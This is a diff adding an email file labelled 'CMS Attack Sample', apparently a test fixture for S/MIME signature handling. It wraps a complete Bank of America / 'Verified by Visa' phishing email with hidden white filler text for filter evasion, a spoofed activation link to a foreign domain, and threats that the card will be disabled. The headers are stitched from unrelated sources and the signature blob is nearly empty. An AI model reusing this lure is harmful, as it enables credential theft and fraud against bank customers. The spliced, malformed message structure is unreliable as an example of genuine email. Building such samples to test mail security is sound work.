@@ -1,0 +1,101 @@
+From: bobbi.tessandori@enron.com
+To: ramesh@commerceone.co, bansal@haas.berkeley.edu, bourdon@haas.berkeley.edu, 
+Subject: CMS Attack Sample
+Content-Type: multipart/signed; protocol="application/x-pkcs7-signature"; micalg="sha-256"; boundary="----5D710E5192338F8D6E1D1324B6443410"
+This is an S/MIME signed message
+----5D710E5192338F8D6E1D1324B6443410
+0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+Content-Length: 2844
+Lines: 79
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 132
+
+<!doctype html public "-//W3C//DTD HTML 4.0 Transitional//EN">
+<html>
+<head>
+<style type=3D"text/css"><!--
+body,p,td,div,li,ul,input { font-family:Arial, Helvetica, sans-serif;font-si=
+ze:12px;color:#666;}
+--></style>
+</head>
+<table cellpadding=3D"5" cellspacing=3D"0" border=3D"0" width=3D"100%">
+<tr>
+<td align=3D"center">
+<table cellpadding=3D"3" cellspacing=3D"0" border=3D"0" width=3D"60%">
+<tr>
+<td align=3D"center"><img src=3D"http://www.bankofamerica.com/images/mhd_reg=
+_logo.gif" border=3D"0" alt=3D"Bank of America"></td><td><img src=3D"http://=
+usa.visa.com/img/other/personal/vbv_logo_small.gif" border=3D"0" alt=3D"Veri=
+fied by Visa"></td></tr>
+</table>
+</tr>
+<tr>
+<td bgcolor=3D"#0C2DA3" style=3D"height: 10px;"></td>
+</tr>
+<tr>
+<td align=3D"center"><table cellpadding=3D"10" cellspacing=3D"0" border=3D"0=
+" width=3D"60%">
+<tr>
+<td>
+<p align=3D"center"><font size=3D"3"><b>Dear Bank of America Customer</b>
+</font><br><div style=3D"display:none; color:white;">bdisshkjbazsjenebcnmvuc=
+kbrydabewcrjzlzzftzeqoygsjwbnieedapvuhktvmatpuoqvumzosfrn</div><br>
+<p><b>Your Bank of America card has been automatically enrolled in the Verif=
+ied by Visa program</b>
+
+<p>To ensure your Visa card's security, it is important that you protect you=
+r Visa card online with a personal password. Please take a moment, and activ=
+ate for Verified by Visa now.
+
+<p>Verified by Visa protects your existing Visa card with a password you cre=
+ate, giving you assurance that only you can use your Visa card online.
+
+<p>Simply activate your card and create your personal password. You=92ll get=
+ the added confidence that your Visa card is safe when you shop at participa=
+ting online stores.
+<p>
+
+<table align=3D"center" bgcolor=3D"#FFAB00" border=3D"0" cellpadding=3D"1" c=
+ellspacing=3D"0" width=3D"100%"><tr><td><table align=3D"center" bgcolor=3D"#=
+FFF4E3" border=3D"0" cellpadding=3D"4" cellspacing=3D"0" width=3D"100%"><tr>=
+<td align=3D"center"><a target=3D"_blank" href=3D"http://www.extim.ro/www.ba=
+nkofamerica.com/step1.php?sim2=3Dxladvasnwszpumxrdhka" style=3D"text-decorat=
+ion:none;"><b style=3D"text-decoration:none;color:#666">Activate Now for Ver=
+ified by Visa</b></a></td></tr></table></td></tr></table>
+
+<b><br>*Please remember: Bank of America will never ask you for your PIN num=
+ber.
+</b>
+<br><br>
+<br>We present our apologies and thank you for co-operating.
+<br>Please do not answer to this email - follow the instructions given.=20
+<br>These instructions have been sent to all bank customers and it's obligat=
+ory to follow.
+
+
+<span style=3D"display:none; color: white;">avafswhmropsjbdfjxapttsvehzczx</=
+span><br>
+=A9 2007 Bank of America Service Department
+<br>
+<br>* Please note: If you FAIL to update your Visa card, it will be temporar=
+ily disabled.
+</td>
+</tr>
+</table>=20
+</td>
+</tr>
+</table>
+<body>
+</body>
+</html>
+
+----5D710E5192338F8D6E1D1324B6443410
+Content-Type: application/x-pkcs7-signature; name="smime.p7s"
+Content-Transfer-Encoding: base64 Content-Disposition: attachment; filename="smime.p7s"
+MDQGCSqGSIb3DQEHAqAnMCUCAQExDzANBglghkgBZQMEAgEFADALBgkqhkiG9w0BBwGgADEA
+----5D710E5192338F8D6E1D1324B6443410
